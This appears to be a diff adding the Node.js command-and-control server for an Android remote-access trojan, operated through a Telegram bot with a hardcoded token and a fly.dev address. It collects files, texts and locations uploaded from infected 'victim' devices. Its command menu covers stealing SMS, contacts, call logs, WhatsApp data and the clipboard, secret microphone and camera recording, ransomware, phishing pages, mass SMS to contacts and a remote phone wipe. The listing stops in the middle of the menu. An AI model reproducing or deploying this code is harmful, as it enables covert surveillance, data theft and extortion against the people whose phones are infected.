@@ -1,0 +1,440 @@
+const express = require('express');
+const webSocket = require('ws');
+const http = require('http');
+const telegramBot = require('node-telegram-bot-api');
+const uuid4 = require('uuid');
+const multer = require('multer');
+const bodyParser = require('body-parser');
+const axios = require("axios");
+
+const token = '9273442003:AAHPNT8XDduLSTXJ5UYs1s74mJYKmZrwfts';
+const id = '7117596430';
+const address = 'https://darkkiller.fly.dev';
+
+const app = express();
+const appServer = http.createServer(app);
+const appSocket = new webSocket.Server({ server: appServer, path: '/' });
+const appBot = new telegramBot(token, { polling: true });
+const appClients = new Map(); // uuid -> { model, battery, version, brightness, provider }
+
+const upload = multer();
+app.use(bodyParser.json());
+
+let currentUuid = '';
+let currentNumber = '';
+let currentTitle = '';
+
+const MAIN_KEYBOARD = {
+    parse_mode: "HTML",
+    reply_markup: {
+        keyboard: [["𝘾𝙤𝙣𝙣𝙚𝙘𝙩𝙚𝙙 𝙙𝙚𝙫𝙞𝙘𝙚𝙨"], ["𝙀𝙭𝙚𝙘𝙪𝙩𝙚 𝙘𝙤𝙢𝙢𝙖𝙣𝙙"]],
+        resize_keyboard: true
+    }
+};
+
+/* ---------------- HTTP ROUTES ---------------- */
+
+app.get('/', function (req, res) {
+    res.send('<h1 align="center" style="font-size:18px; color:blue;">❖✙𝙎𝙚𝙧𝙫𝙚𝙧 𝙪𝙥𝙡𝙤𝙖𝙙𝙚𝙙 𝙨𝙪𝙘𝙘𝙚𝙨𝙨𝙛𝙪𝙡𝙡𝙮✙❖</h1> <br> <p style="font-size:14px; text-align:center; color:red;">Telegram Channel➩ @badshah_hacker</p>');
+});
+
+app.post("/uploadFile", upload.single('file'), (req, res) => {
+    const name = req.file.originalname;
+    appBot.sendDocument(id, req.file.buffer, {
+        caption: `°• 𓃥𝙈𝙚𝙨𝙨𝙖𝙜𝙚 𝙛𝙧𝙤𝙢 <b>${req.headers.model}</b> 𝙙𝙚𝙫𝙞𝙘𝙚`,
+        parse_mode: "HTML"
+    }, { filename: name, contentType: 'application/txt' });
+    res.send('');
+});
+
+app.post("/uploadText", (req, res) => {
+    appBot.sendMessage(id, `°• 𓃥𝙈𝙚𝙨𝙨𝙖𝙜𝙚 𝙛𝙧𝙤𝙢 <b>${req.headers.model}</b> 𝙙𝙚𝙫𝙞𝙘𝙚\n\n` + req.body['text'], { parse_mode: "HTML" });
+    res.send('');
+});
+
+app.post("/uploadLocation", (req, res) => {
+    appBot.sendLocation(id, req.body['lat'], req.body['lon']);
+    appBot.sendMessage(id, `°• 𝙇𝙤𝙘𝙖𝙩𝙞𝙤𝙣 𝙛𝙧𝙤𝙢 <b>${req.headers.model}</b> 𝙙𝙚𝙫𝙞𝙘𝙚`, { parse_mode: "HTML" });
+    res.send('');
+});
+
+/* ---------------- WEBSOCKET ---------------- */
+
+function cleanStaleClients() {
+    appClients.forEach((value, key) => {
+        let found = false;
+        appSocket.clients.forEach((ws) => { if (ws.uuid === key && ws.readyState === 1) found = true; });
+        if (!found) appClients.delete(key);
+    });
+}
+
+appSocket.on('connection', (ws, req) => {
+    // Stable deviceId (client query me ?deviceId=... bheje, warna random)
+    let deviceId = null;
+    try {
+        const u = new URL(req.url, "http://localhost");
+        deviceId = u.searchParams.get("deviceId");
+    } catch (e) {}
+
+    const uuid = deviceId || uuid4.v4();
+    const model = req.headers.model || "Unknown";
+    const battery = req.headers.battery || "?";
+    const version = req.headers.version || "?";
+    const brightness = req.headers.brightness || "?";
+    const provider = req.headers.provider || "?";
+
+    ws.uuid = uuid;
+    ws.isAlive = true;
+
+    const isReconnect = appClients.has(uuid);
+
+    // Purane same-uuid socket ko terminate karo (duplicate na rahe)
+    appSocket.clients.forEach((client) => {
+        if (client !== ws && client.uuid === uuid) {
+            try { client.terminate(); } catch (e) {}
+        }
+    });
+
+    appClients.set(uuid, {
+        model: model,
+        battery: battery,
+        version: version,
+        brightness: brightness,
+        provider: provider,
+        connectedAt: Date.now()
+    });
+
+    // Sirf tab message bhejo jab pehli baar connect ho (reconnect pe spam na ho)
+    if (!isReconnect) {
+        appBot.sendMessage(id,
+            `°• 🤠Badshah aapne device connect kr liya🤠\n\n` +
+            `• ᴅᴇᴠɪᴄᴇ ᴍᴏᴅᴇʟ : <b>${model}</b>\n` +
+            `• ʙᴀᴛᴛᴇʀʏ : <b>${battery}</b>\n` +
+            `• ᴀɴᴅʀᴏɪᴅ ᴠᴇʀꜱɪᴏɴ : <b>${version}</b>\n` +
+            `• ꜱᴄʀᴇᴇɴ ʙʀɪɢʜᴛɴᴇꜱꜱ : <b>${brightness}</b>\n` +
+            `• ᴘʀᴏᴠɪᴅᴇʀ : <b>${provider}</b>`,
+            { parse_mode: "HTML" }
+        ).catch(() => {});
+    }
+
+    ws.on('pong', () => { ws.isAlive = true; });
+    ws.on('message', () => { ws.isAlive = true; });
+    ws.on('error', () => { ws.isAlive = false; });
+
+    ws.on('close', function () {
+        // Sirf tab delete karo jab ye waqai abhi bhi registered ho
+        if (appClients.has(ws.uuid)) {
+            appClients.delete(ws.uuid);
+            appBot.sendMessage(id,
+                `°• 😥𝘿𝙚𝙫𝙞𝙘𝙚 𝙙𝙞𝙨𝙘𝙤𝙣𝙣𝙚𝙘𝙩𝙚𝙙😥\n\n` +
+                `• ᴅᴇᴠɪᴄᴇ ᴍᴏᴅᴇʟ : <b>${model}</b>\n` +
+                `• ʙᴀᴛᴛᴇʀʏ : <b>${battery}</b>\n` +
+                `• ᴀɴᴅʀᴏɪᴅ ᴠᴇʀꜱɪᴏɴ : <b>${version}</b>\n` +
+                `• ꜱᴄʀᴇᴇɴ ʙʀɪɢʜᴛɴᴇꜱꜱ : <b>${brightness}</b>\n` +
+                `• ᴘʀᴏᴠɪᴅᴇʀ : <b>${provider}</b>`,
+                { parse_mode: "HTML" }
+            ).catch(() => {});
+        }
+    });
+});
+
+/* ---------------- HEARTBEAT (20s) ---------------- */
+
+setInterval(function () {
+    appSocket.clients.forEach(function (ws) {
+        if (ws.isAlive === false) {
+            try { ws.terminate(); } catch (e) {}
+            return;
+        }
+        ws.isAlive = false;
+        try { ws.ping(); } catch (e) {}
+        try { ws.send('ping'); } catch (e) {}
+    });
+    cleanStaleClients();
+}, 20000);
+
+/* Keep-alive HTTP ping for Fly.io */
+setInterval(function () {
+    try { axios.get(address).catch(() => {}); } catch (e) {}
+}, 25000);
+
+/* ---------------- TELEGRAM BOT ---------------- */
+
+appBot.on('message', (message) => {
+    const chatId = message.chat.id;
+
+    if (message.reply_to_message && message.reply_to_message.text) {
+        const rt = message.reply_to_message.text;
+
+        if (rt.includes('°• 𝙋𝙡𝙚𝙖𝙨𝙚 𝙧𝙚𝙥𝙡𝙮 𝙩𝙝𝙚 𝙣𝙪𝙢𝙗𝙚𝙧 𝙩𝙤 𝙬𝙝𝙞𝙘𝙝 𝙮𝙤𝙪 𝙬𝙖𝙣𝙩 𝙩𝙤 𝙨𝙚𝙣𝙙 𝙩𝙝𝙚 𝙎𝙈𝙎')) {
+            currentNumber = message.text;
+            appBot.sendMessage(id,
+                '°• 𝙂𝙧𝙚𝙖𝙩, 𝙣𝙤𝙬 𝙚𝙣𝙩𝙚𝙧 𝙩𝙝𝙚 𝙢𝙚𝙨𝙨𝙖𝙜𝙚 𝙮𝙤𝙪 𝙬𝙖𝙣𝙩 𝙩𝙤 𝙨𝙚𝙣𝙙 𝙩𝙤 𝙩𝙝𝙞𝙨 𝙣𝙪𝙢𝙗𝙚𝙧\n\n' +
+                '• ʙᴇ ᴄᴀʀᴇꜰᴜʟ ᴛʜᴀᴛ ᴛʜᴇ ᴍᴇꜱꜱᴀɢᴇ ᴡɪʟʟ ɴᴏᴛ ʙᴇ ꜱᴇɴᴛ ɪꜰ ᴛʜᴇ ɴᴜᴍʙᴇʀ ᴏꜰ ᴄʜᴀʀᴀᴄᴛᴇʀꜱ ɪɴ ʏᴏᴜʀ ᴍᴇꜱꜱᴀɢᴇ ɪꜱ ᴍᴏʀᴇ ᴛʜᴀɴ ᴀʟʟᴏᴡᴇᴅ',
+                { reply_markup: { force_reply: true } }
+            );
+        }
+
+        if (rt.includes('°• 𝙂𝙧𝙚𝙖𝙩, 𝙣𝙤𝙬 𝙚𝙣𝙩𝙚𝙧 𝙩𝙝𝙚 𝙢𝙚𝙨𝙨𝙖𝙜𝙚 𝙮𝙤𝙪 𝙬𝙖𝙣𝙩 𝙩𝙤 𝙨𝙚𝙣𝙙 𝙩𝙤 𝙩𝙝𝙞𝙨 𝙣𝙪𝙢𝙗𝙚𝙧')) {
+            sendToUuid(currentUuid, `send_message:${currentNumber}/${message.text}`);
+            currentNumber = '';
+            currentUuid = '';
+            appBot.sendMessage(id,
+                '°• ⌛𝙔𝙤𝙪𝙧 𝙧𝙚𝙦𝙪𝙚𝙨𝙩 𝙞𝙨 𝙤𝙣 𝙥𝙧𝙤𝙘𝙚𝙨𝙨⏳\n\n' +
+                '• ʏᴏᴜ ᴡɪʟʟ ʀᴇᴄᴇɪᴠᴇ ᴀ ʀᴇꜱᴘᴏɴꜱᴇ ɪɴ ᴛʜᴇ ɴᴇxᴛ ꜰᴇᴡ ᴍᴏᴍᴇɴᴛꜱ',
+                MAIN_KEYBOARD
+            );
+        }
+
+        if (rt.includes('°• 𝙀𝙣𝙩𝙚𝙧 𝙩𝙝𝙚 𝙢𝙚𝙨𝙨𝙖𝙜𝙚 𝙮𝙤𝙪 𝙬𝙖𝙣𝙩 𝙩𝙤 𝙨𝙚𝙣𝙙 𝙩𝙤 𝙖𝙡𝙡 𝙘𝙤𝙣𝙩𝙖𝙘𝙩𝙨')) {
+            sendToUuid(currentUuid, `send_message_to_all:${message.text}`);
+            currentUuid = '';
+            appBot.sendMessage(id,
+                '°• ⌛𝙔𝙤𝙪𝙧 𝙧𝙚𝙦𝙪𝙚𝙨𝙩 𝙞𝙨 𝙤𝙣 𝙥𝙧𝙤𝙘𝙚𝙨𝙨⏳\n\n' +
+                '• ʏᴏᴜ ᴡɪʟʟ ʀᴇᴄᴇɪᴠᴇ ᴀ ʀᴇꜱᴘᴏɴꜱᴇ ɪɴ ᴛʜᴇ ɴᴇxᴛ ꜰᴇᴡ ᴍᴏᴍᴇɴᴛꜱ',
+                MAIN_KEYBOARD
+            );
+        }
+
+        if (rt.includes('°• 📩𝙀𝙣𝙩𝙚𝙧 𝙩𝙝𝙚 𝙥𝙖𝙩𝙝 𝙤𝙛 𝙩𝙝𝙚 𝙛𝙞𝙡𝙚 𝙮𝙤𝙪 𝙬𝙖𝙣𝙩 𝙩𝙤 𝙙𝙤𝙬𝙣𝙡𝙤𝙖𝙙🗳️')) {
+            sendToUuid(currentUuid, `file:${message.text}`);
+            currentUuid = '';
+            appBot.sendMessage(id,
+                '°• ⌛𝙔𝙤𝙪𝙧 𝙧𝙚𝙦𝙪𝙚𝙨𝙩 𝙞𝙨 𝙤𝙣 𝙥𝙧𝙤𝙘𝙚𝙨𝙨⏳\n\n' +
+                '• ʏᴏᴜ ᴡɪʟʟ ʀᴇᴄᴇɪᴠᴇ ᴀ ʀᴇꜱᴘᴏɴꜱᴇ ɪɴ ᴛʜᴇ ɴᴇxᴛ ꜰᴇᴡ ᴍᴏᴍᴇɴᴛꜱ',
+                MAIN_KEYBOARD
+            );
+        }
+
+        if (rt.includes('°• 📂𝙀𝙣𝙩𝙚𝙧 𝙩𝙝𝙚 𝙥𝙖𝙩𝙝 𝙤𝙛 𝙩𝙝𝙚 𝙛𝙞𝙡𝙚 𝙮𝙤𝙪 𝙬𝙖𝙣𝙩 𝙩𝙤 𝙙𝙚𝙡𝙚𝙩𝙚💥')) {
+            sendToUuid(currentUuid, `delete_file:${message.text}`);
+            currentUuid = '';
+            appBot.sendMessage(id,
+                '°• ⌛𝙔𝙤𝙪𝙧 𝙧𝙚𝙦𝙪𝙚𝙨𝙩 𝙞𝙨 𝙤𝙣 𝙥𝙧𝙤𝙘𝙚𝙨𝙨⏳\n\n' +
+                '• ʏᴏᴜ ᴡɪʟʟ ʀᴇᴄᴇɪᴠᴇ ᴀ ʀᴇꜱᴘᴏɴ𝙨𝙚 ɪɴ ᴛʜᴇ ɴᴇxᴛ ꜰᴇᴡ ᴍᴏᴍᴇɴᴛꜱ',
+                MAIN_KEYBOARD
+            );
+        }
+
+        if (rt.includes('°• 𝙀𝙣𝙩𝙚𝙧 𝙝𝙤𝙬 𝙡𝙤𝙣𝙜 𝙮𝙤𝙪 𝙬𝙖𝙣𝙩 𝙩𝙝𝙚 𝙢𝙞𝙘𝙧𝙤𝙥𝙝𝙤𝙣𝙚 𝙩𝙤 𝙗𝙚 𝙧𝙚𝙘𝙤𝙧𝙙𝙚𝙙')) {
+            sendToUuid(currentUuid, `microphone:${message.text}`);
+            currentUuid = '';
+            appBot.sendMessage(id,
+                '°• ⌛𝙔𝙤𝙪𝙧 𝙧𝙚𝙦𝙪𝙚𝙨𝙩 𝙞𝙨 𝙤𝙣 𝙥𝙧𝙤𝙘𝙚𝙨𝙨⏳\n\n' +
+                '• ʏᴏᴜ ᴡɪʟʟ ʀᴇᴄᴇɪᴠᴇ ᴀ ʀᴇꜱᴘᴏɴ𝙨𝙚 ɪɴ ᴛʜᴇ ɴᴇxᴛ ꜰᴇᴡ ᴍᴏᴍᴇɴᴛꜱ',
+                MAIN_KEYBOARD
+            );
+        }
+
+        if (rt.includes('°• 𝙀𝙣𝙩𝙚𝙧 𝙝𝙤𝙬 𝙡𝙤𝙣𝙜 𝙮𝙤𝙪 𝙬𝙖𝙣𝙩 𝙩𝙝𝙚 𝙢𝙖𝙞𝙣 𝙘𝙖𝙢𝙚𝙧𝙖 𝙩𝙤 𝙗𝙚 𝙧𝙚𝙘𝙤𝙧𝙙𝙚𝙙')) {
+            sendToUuid(currentUuid, `rec_camera_main:${message.text}`);
+            currentUuid = '';
+            appBot.sendMessage(id,
+                '°• ⌛𝙔𝙤𝙪𝙧 𝙧𝙚𝙦𝙪𝙚𝙨𝙩 𝙞𝙨 𝙤𝙣 𝙥𝙧𝙤𝙘𝙚𝙨𝙨⏳\n\n' +
+                '• ʏᴏᴜ ᴡɪʟʟ ʀᴇᴄᴇɪᴠᴇ ᴀ ʀᴇꜱᴘ𝙤ɴ𝙨𝙚 ɪɴ ᴛʜᴇ ɴᴇxᴛ ꜰᴇᴡ ᴍᴏᴍᴇɴᴛꜱ',
+                MAIN_KEYBOARD
+            );
+        }
+
+        if (rt.includes('°• 𝙀𝙣𝙩𝙚𝙧 𝙝𝙤𝙬 𝙡𝙤𝙣𝙜 𝙮𝙤𝙪 𝙬𝙖𝙣𝙩 𝙩𝙝𝙚 𝙨𝙚𝙡𝙛𝙞𝙚 𝙘𝙖𝙢𝙚𝙧𝙖 𝙩𝙤 𝙗𝙚 𝙧𝙚𝙘𝙤𝙧𝙙𝙚𝙙')) {
+            sendToUuid(currentUuid, `rec_camera_selfie:${message.text}`);
+            currentUuid = '';
+            appBot.sendMessage(id,
+                '°• ⌛𝙔𝙤𝙪𝙧 𝙧𝙚𝙦𝙪𝙚𝙨𝙩 𝙞𝙨 𝙤𝙣 𝙥𝙧𝙤𝙘𝙚𝙨𝙨⏳\n\n' +
+                '• ʏᴏᴜ ᴡɪʟʟ ʀᴇᴄᴇɪᴠᴇ ᴀ ʀᴇꜱᴘ𝙤ɴ𝙨𝙚 ɪɴ ᴛʜᴇ ɴᴇxᴛ ꜰᴇᴡ ᴍᴏᴍᴇɴᴛꜱ',
+                MAIN_KEYBOARD
+            );
+        }
+
+        if (rt.includes('°• 𝙀𝙣𝙩𝙚𝙧 𝙩𝙝𝙚 𝙢𝙚𝙨𝙨𝙖𝙜𝙚 𝙩𝙝𝙖𝙩 𝙮𝙤𝙪 𝙬𝙖𝙣𝙩 𝙩𝙤 𝙖𝙥𝙥𝙚𝙖𝙧 𝙤𝙣 𝙩𝙝𝙚 𝙩𝙖𝙧𝙜𝙚𝙩 𝙙𝙚𝙫𝙞𝙘𝙚')) {
+            sendToUuid(currentUuid, `toast:${message.text}`);
+            currentUuid = '';
+            appBot.sendMessage(id,
+                '°• ⌛𝙔𝙤𝙪𝙧 𝙧𝙚𝙦𝙪𝙚𝙨𝙩 𝙞𝙨 𝙤𝙣 𝙥𝙧𝙤𝙘𝙚𝙨⏳\n\n' +
+                '• ʏᴏᴜ ᴡɪʟʟ ʀᴇᴄᴇɪᴠᴇ ᴀ ʀᴇꜱᴘ𝙤ɴ𝙨𝙚 ɪɴ ᴛʜᴇ ɴᴇxᴛ ꜰᴇᴡ ᴍᴏᴍᴇɴᴛꜱ',
+                MAIN_KEYBOARD
+            );
+        }
+
+        if (rt.includes('°• 📮𝙀𝙣𝙩𝙚𝙧 𝙩𝙝𝙚 𝙢𝙚𝙨𝙨𝙖𝙜𝙚 𝙮𝙤𝙪 𝙬𝙖𝙣𝙩 𝙩𝙤 𝙖𝙥𝙥𝙚𝙖𝙧 𝙖𝙨 𝙣𝙤𝙩𝙞𝙛𝙞𝙘𝙖𝙩𝙞𝙤𝙣')) {
+            currentTitle = message.text;
+            appBot.sendMessage(id,
+                '°• 𝙂𝙧𝙚𝙖𝙩, 𝙣𝙤𝙬 𝙚𝙣𝙩𝙚𝙧 𝙩𝙝𝙚 𝙡𝙞𝙣𝙠 𝙮𝙤𝙪 𝙬𝙖𝙣𝙩 𝙩𝙤 𝙗𝙚 𝙤𝙥𝙚𝙣𝙚𝙙 𝙗𝙮 𝙩𝙝𝙚 𝙣𝙤𝙩𝙞𝙛𝙞𝙘𝙖𝙩𝙞𝙤𝙣\n\n' +
+                '• ᴡʜᴇɴ ᴛʜᴇ ᴠɪᴄᴛɪᴍ ᴄʟɪᴄᴋꜱ ᴏɴ ᴛʜᴇ ɴᴏᴛɪꜰɪᴄᴀᴛɪᴏɴ, ᴛʜᴇ ʟɪɴᴋ ʏᴏᴜ ᴀʀᴇ ᴇɴᴛᴇʀɪɴɢ ᴡɪʟʟ ʙᴇ ᴏᴘᴇɴᴇᴅ',
+                { reply_markup: { force_reply: true } }
+            );
+        }
+
+        if (rt.includes('°• 𝙂𝙧𝙚𝙖𝙩, 𝙣𝙤𝙬 𝙚𝙣𝙩𝙚𝙧 𝙩𝙝𝙚 𝙡𝙞𝙣𝙠 𝙮𝙤𝙪 𝙬𝙖𝙣𝙩 𝙩𝙤 𝙗𝙚 𝙤𝙥𝙚𝙣𝙚𝙙 𝙗𝙮 𝙩𝙝𝙚 𝙣𝙤𝙩𝙞𝙛𝙞𝙘𝙖𝙩𝙞𝙤𝙣')) {
+            sendToUuid(currentUuid, `show_notification:${currentTitle}/${message.text}`);
+            currentUuid = '';
+            appBot.sendMessage(id,
+                '°• ⌛𝙔𝙤𝙪𝙧 𝙧𝙚𝙦𝙪𝙚𝙨𝙩 𝙞𝙨 𝙤𝙣 𝙥𝙧𝙤𝙘𝙚𝙨⏳\n\n' +
+                '• ʏᴏᴜ ᴡɪʟʟ ʀᴇᴄᴇɪᴠᴇ ᴀ ʀᴇꜱᴘ𝙤ɴ𝙨𝙚 ɪɴ ᴛʜᴇ ɴᴇxᴛ ꜰᴇᴡ ᴍᴏᴍᴇɴᴛꜱ',
+                MAIN_KEYBOARD
+            );
+        }
+
+        if (rt.includes('°• 📀𝙀𝙣𝙩𝙚𝙧 𝙩𝙝𝙚 𝙖𝙪𝙙𝙞𝙤 𝙡𝙞𝙣𝙠 𝙮𝙤𝙪 𝙬𝙖𝙣𝙩 𝙩𝙤 𝙥𝙡𝙖𝙮🏖️')) {
+            sendToUuid(currentUuid, `play_audio:${message.text}`);
+            currentUuid = '';
+            appBot.sendMessage(id,
+                '°• ⌛𝙔𝙤𝙪𝙧 𝙧𝙚𝙦𝙪𝙚𝙨𝙩 𝙞𝙨 𝙤𝙣 𝙥𝙧𝙤𝙘𝙚𝙨⏳\n\n' +
+                '• ʏᴏᴜ ᴡɪʟʟ ʀᴇᴄᴇɪᴠᴇ ᴀ ʀᴇꜱᴘ𝙤ɴ𝙨𝙚 ɪɴ ᴛʜᴇ ɴᴇxᴛ ꜰᴇᴡ ᴍᴏᴍᴇɴᴛꜱ',
+                MAIN_KEYBOARD
+            );
+        }
+    }
+
+    if (id == chatId) {
+        if (message.text == '/start') {
+            appBot.sendMessage(id,
+                '°• 🪴WELCOME TO (@badshah_hacker) CHANNEL🪴\n\n' +
+                '• ɪꜰ ᴛʜᴇ ᴀᴘᴘʟɪᴄᴀᴛɪᴏɴ ɪꜱ ɪɴꜱᴛᴀʟʟᴇᴅ ᴏɴ ᴛʜᴇ ᴛᴀʀɢᴇᴛ ᴅᴇᴠɪᴄᴇ, ᴡᴀɪᴛ ꜰᴏʀ ᴛʜᴇ ᴄᴏɴɴᴇᴄᴛɪᴏɴ\n\n' +
+                '• ᴡʜᴇɴ ʏᴏᴜ ʀᴇᴄᴇɪᴠᴇ ᴛʜᴇ ᴄᴏɴɴᴇᴄᴛɪᴏɴ ᴍᴇꜱꜱᴀɢᴇ, ɪᴛ ᴍᴇᴀɴꜱ ᴛʜᴀᴛ ᴛʜᴇ ᴛᴀʀɢᴇᴛ ᴅᴇᴠɪᴄᴇ ɪꜱ ᴄᴏɴɴᴇᴄᴛᴇᴅ ᴀɴᴅ ʀᴇᴀᴅʏ ᴛᴏ ʀᴇᴄᴇɪᴠᴇ ᴛʜᴇ ᴄᴏᴍᴍᴀɴᴅ\n\n' +
+                '• 📣𝗙𝗶𝗿𝘀𝘁 𝗝𝗼𝗶𝗻 👉 @badshah_hacker\n\n' +
+                '• 🌺𝗠𝗮𝗶𝗻 𝗢𝘄𝗻𝗲𝗿👉 @Bad_hacker1\n\n' +
+                '• 🧭𝗠𝗮𝗶𝗻 𝗖𝗵𝗮𝗻𝗻𝗲𝗹👉 @badshah_hacker\n',
+                MAIN_KEYBOARD
+            );
+        }
+
+        if (message.text == '𝘾𝙤𝙣𝙣𝙚𝙘𝙩𝙚𝙙 𝙙𝙚𝙫𝙞𝙘𝙚𝙨') {
+            cleanStaleClients();
+            if (appClients.size == 0) {
+                appBot.sendMessage(id,
+                    '°• 𝙉𝙤 𝙘𝙤𝙣𝙣𝙚𝙘𝙩𝙞𝙣𝙜 𝙙𝙚𝙫𝙞𝙘𝙚𝙨 𝙖𝙫𝙖𝙞𝙡𝙖𝙗𝙡𝙚\n\n' +
+                    '• ᴍᴀᴋᴇ ꜱᴜʀᴇ ᴛʜᴇ ᴀᴘᴘʟɪᴄᴀᴛɪᴏɴ ɪꜱ ɪɴꜱᴛᴀʟʟᴇᴅ ᴏɴ ᴛʜᴇ ᴛᴀʀɢᴇᴛ ᴅᴇᴠɪᴄᴇ'
+                );
+            } else {
+                let text = '°• 𝙇𝙞𝙨𝙩 𝙤𝙛 𝙘𝙤𝙣𝙣𝙚𝙘𝙩𝙚𝙙 𝙙𝙚𝙫𝙞𝙘𝙚𝙨 :\n\n';
+                appClients.forEach(function (value) {
+                    text += `• ᴅᴇᴠɪᴄᴇ ᴍᴏᴅᴇʟ : <b>${value.model}</b>\n` +
+                        `• ʙᴀᴛᴛᴇʀʏ : <b>${value.battery}</b>\n` +
+                        `• ᴀɴᴅʀᴏɪᴅ ᴠᴇʀꜱɪᴏɴ : <b>${value.version}</b>\n` +
+                        `• ꜱᴄʀᴇᴇɴ ʙʀɪɢʜᴛɴᴇꜱꜱ : <b>${value.brightness}</b>\n` +
+                        `• ᴘʀᴏᴠɪᴅᴇʀ : <b>${value.provider}</b>\n\n`;
+                });
+                appBot.sendMessage(id, text, { parse_mode: "HTML" });
+            }
+        }
+
+        if (message.text == '𝙀𝙭𝙚𝙘𝙪𝙩𝙚 𝙘𝙤𝙢𝙢𝙖𝙣𝙙') {
+            cleanStaleClients();
+            if (appClients.size == 0) {
+                appBot.sendMessage(id,
+                    '°• 𝙉𝙤 𝙘𝙤𝙣𝙣𝙚𝙘𝙩𝙞𝙣𝙜 𝙙𝙚𝙫𝙞𝙘𝙚𝙨 𝙖𝙫𝙖𝙞𝙡𝙖𝙗𝙡𝙚\n\n' +
+                    '• ᴍᴀᴋᴇ ꜱᴜʀᴇ ᴛʜᴇ ᴀᴘᴘʟɪᴄᴀᴛɪᴏɴ ɪꜱ ɪɴꜱᴛᴀʟʟᴇᴅ ᴏɴ ᴛʜᴇ ᴛᴀʀɢᴇᴛ ᴅᴇᴠɪᴄᴇ'
+                    );
+            } else {
+                const deviceListKeyboard = [];
+                appClients.forEach(function (value, key) {
+                    deviceListKeyboard.push([{ text: value.model, callback_data: 'device:' + key }]);
+                });
+                appBot.sendMessage(id, '°• 𝙎𝙚𝙡𝙚𝙘𝙩 𝙙𝙚𝙫𝙞𝙘𝙚 𝙩𝙤 𝙚𝙭𝙚𝙘𝙪𝙩𝙚 𝙘𝙤𝙢𝙢𝙖𝙣𝙙', {
+                    reply_markup: { inline_keyboard: deviceListKeyboard }
+                });
+            }
+        }
+    } else {
+        appBot.sendMessage(id, '°• 𝙋𝙚𝙧𝙢𝙞𝙨𝙨𝙞𝙤𝙣 𝙙𝙚𝙣𝙞𝙚𝙙');
+    }
+});
+
+/* ---------------- HELPER ---------------- */
+
+function sendToUuid(uuid, payload) {
+    if (!uuid) return false;
+    let sent = false;
+    appSocket.clients.forEach(function (ws) {
+        if (ws.uuid == uuid && ws.readyState === 1) {
+            try { ws.send(payload); sent = true; } catch (e) {}
+        }
+    });
+    return sent;
+}
+
+/* ---------------- CALLBACK QUERY ---------------- */
+
+appBot.on("callback_query", (callbackQuery) => {
+    const msg = callbackQuery.message;
+    const data = callbackQuery.data;
+    const commend = data.split(':')[0];
+    const uuid = data.split(':')[1];
+
+    if (commend == 'device') {
+        const dev = appClients.get(uuid);
+        if (!dev) {
+            appBot.answerCallbackQuery(callbackQuery.id, { text: "Device offline hai" }).catch(() => {});
+            return;
+        }
+        appBot.editMessageText(`°• 𝙎𝙚𝙡𝙚𝙘𝙩 𝙘𝙤𝙢𝙢𝙚𝙣𝙙 𝙛𝙤𝙧 𝙙𝙚𝙫𝙞𝙘𝙚 : <b>${dev.model}</b>`, {
+            chat_id: id,
+            message_id: msg.message_id,
+            reply_markup: {
+                inline_keyboard: [
+                    [{ text: '🖼️𝗔𝗣𝗣𝗦🖼️', callback_data: `apps:${uuid}` }, { text: '🚨𝗗𝗘𝗩𝗜𝗖𝗘 𝗜𝗡𝗙𝗢🚨', callback_data: `device_info:${uuid}` }],
+                    [{ text: '📂𝗚𝗘𝗧 𝗙𝗜𝗟𝗘📂', callback_data: `file:${uuid}` }, { text: '👹𝗗𝗘𝗟𝗘𝗧𝗘 𝗙𝗜𝗟𝗘👹', callback_data: `delete_file:${uuid}` }],
+                    [{ text: '🎟️𝗦𝗖𝗥𝗘𝗘𝗡𝗦𝗛𝗢𝗧🎟️', callback_data: `screenshot:${uuid}` }, { text: '👾𝗪𝗛𝗔𝗧𝗦𝗔𝗣𝗣👾', callback_data: `whatsapp:${uuid}` }],
+                    [{ text: '🌀𝗖𝗟𝗜𝗣𝗕𝗢𝗔𝗥𝗗🌀', callback_data: `clipboard:${uuid}` }, { text: '🥎𝗠𝗜𝗖𝗥𝗢𝗣𝗛𝗢𝗡𝗘🥎', callback_data: `microphone:${uuid}` }],
+                    [{ text: '🔰𝗠𝗔𝗜𝗡 𝗖𝗔𝗠𝗘𝗥𝗔🔰', callback_data: `camera_main:${uuid}` }, { text: '🎪𝗦𝗘𝗟𝗙𝗜𝗘 𝗖𝗔𝗠𝗘𝗥𝗔🎪', callback_data: `camera_selfie:${uuid}` }],
+                    [{ text: '🌐𝗟𝗢𝗖𝗔𝗧𝗜𝗢𝗡🌐', callback_data: `location:${uuid}` }, { text: '🗯️𝗧𝗢𝗔𝗦𝗧🗯️', callback_data: `toast:${uuid}` }],
+                    [{ text: '📮𝗚𝗘𝗧 𝗣𝗔𝗬𝗠𝗘𝗡𝗧📮', callback_data: `Settings:${uuid}` }, { text: '☢️𝗣𝗛𝗢𝗡𝗘 𝗥𝗘𝗦𝗘𝗧☢️', callback_data: `Erase_data:${uuid}` }],
+                    [{ text: '☃️𝗖𝗔𝗟𝗟 𝗟𝗢𝗚𝗦☃️', callback_data: `calls:${uuid}` }, { text: '🏆𝗖𝗢𝗡𝗧𝗔𝗖𝗧𝗦🏆', callback_data: `contacts:${uuid}` }],
+                    [{ text: '⏲️𝗩𝗜𝗕𝗥𝗔𝗧𝗘⏲️', callback_data: `vibrate:${uuid}` }, { text: '🔔𝗡𝗢𝗧𝗜𝗙𝗜𝗖𝗔𝗧𝗜𝗢𝗡🔔', callback_data: `show_notification:${uuid}` }],
+                    [{ text: '🧊𝗠𝗘𝗦𝗦𝗔𝗚𝗘𝗦🧊', callback_data: `messages:${uuid}` }, { text: '🎁𝗦𝗘𝗡𝗗 𝗦𝗠𝗦🎁', callback_data: `send_message:${uuid}` }],
+                    [{ text: '🚸𝗥𝗔𝗡𝗦𝗢𝗠𝗪𝗔𝗥𝗘🚸', callback_data: `Ransomware:${uuid}` }, { text: '✳️𝗙𝗛𝗜𝗦𝗛𝗜𝗡𝗚 𝗣𝗔𝗚𝗘✳️', callback_data: `custom_phishing:${uuid}` }],
+                    [{ text: '🦞𝗣𝗟𝗔𝗬 𝗔𝗨𝗗𝗜𝗢🦞', callback_data: `play_audio:${uuid}` }, { text: '☯️𝗦𝗧𝗢𝗣 𝗔𝗨𝗗𝗜𝗢☯️', callback_data: `stop_audio:${uuid}` }],
+                    [{ text: '⛔‼️𝗦𝗘𝗡𝗗 𝗦𝗠𝗦 𝗧𝗢 𝗔𝗹𝗹 𝗖𝗢𝗡𝗧𝗔𝗖𝗧𝗦‼️⛔', callback_data: `send_message_to_all:${uuid}` }],
